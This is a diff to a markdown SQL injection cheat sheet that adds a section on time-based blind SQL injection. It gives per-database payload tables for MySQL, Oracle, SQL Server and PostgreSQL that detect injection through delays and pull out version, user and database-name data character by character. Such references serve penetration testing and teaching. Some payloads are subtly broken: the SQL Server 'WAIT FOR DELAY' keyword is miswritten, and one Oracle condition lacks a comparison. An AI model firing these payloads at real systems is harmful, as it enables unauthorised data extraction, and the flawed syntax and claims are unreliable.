@@ -30,6 +30,8 @@ When a parameter that is used in a **SQL query** is found (such as a username in
 
 If an **error** occurs or the application's **behaviour changes**, then the parameter is **injectable**.
 
+If **no error** occurs and the application's **behaviour does not change**, the parameter may still be vulnerable to **blind SQL injection** vulnerabilities.
+
 ## UNION attack
 
 If the output of a query is **visible** and there is an injectable parameter, **UNION attacks** are possible. However, some information has to be found.
@@ -156,4 +158,31 @@ An empty **secure_file_priv** variable (*i.e.* **\'\'**) allows file operations 
 
 
 #### PostgreSQL
+
+
+## Blind SQL injection
+
+A SQL injection is **blind** whenever the front-end does not show the query's output directly.
+
+### Time-based blind SQL injection
+
+To detect a **time-based** blind SQL injection it is necessary to inject the following queries.
+
+|       **DBMS**       |                      **Payload**                      | **Expected output** |
+|:--------------------:|:-----------------------------------------------------:|:-------------------:|
+|         MySQL        |                      1-SLEEP(10);                     |   Delayed response  |
+|        Oracle        | AND 1=DBMS_PIPE.RECEIVE_MESSAGE(\'a\', 10) FROM dual; |   Delayed response  |
+| Microsoft SQL Server |            1; WAIT FOR DELAY \'00:00:10\';            |   Delayed response  |
+|      PostgreSQL      |                    ; pg_sleep(10);                    |   Delayed response  |
+
+Oracle is not really vulnerable to this kind of vulnerability. If it is, the only possible option is to use the **PL/SQL SLEEP** function, but it is rarely enabled.
+
+If a delayed response is observed, time delays can also be used to infer information based on **boolean conditions**. Usually, to extract **string-type data** it is necessary to check each character incrementally.
+
+|       **DBMS**       |                                                     **Payload**                                                     |    **Expected output**     |
+|:--------------------:|:-------------------------------------------------------------------------------------------------------------------:|:--------------------------:|
+|         MySQL        |                                   1-IF(MID(version(), 1, 1) = '5', SLEEP(5), 0);                                    |   Delayed response if true |
+|        Oracle        | AND \'a\' = (SELECT CASE WHEN SUBSTR(user, 1, 1) THEN DBMS_PIPE.RECEIVE_MESSAGE(\'a\', 5) ELSE NULL END FROM dual); |   Delayed response if true |
+| Microsoft SQL Server |                         IF (SUBSTRING(DB_NAME(), 1, 1) = \'a\') WAIT FOR DELAY \'00:00:05\';                        |   Delayed response if true |
+|      PostgreSQL      |             ; SELECT CASE WHEN (SUBSTRING(version(), 1, 1) = '1') THEN pg_sleep(5) ELSE pg_sleep(0) END;            |   Delayed response if true |
 
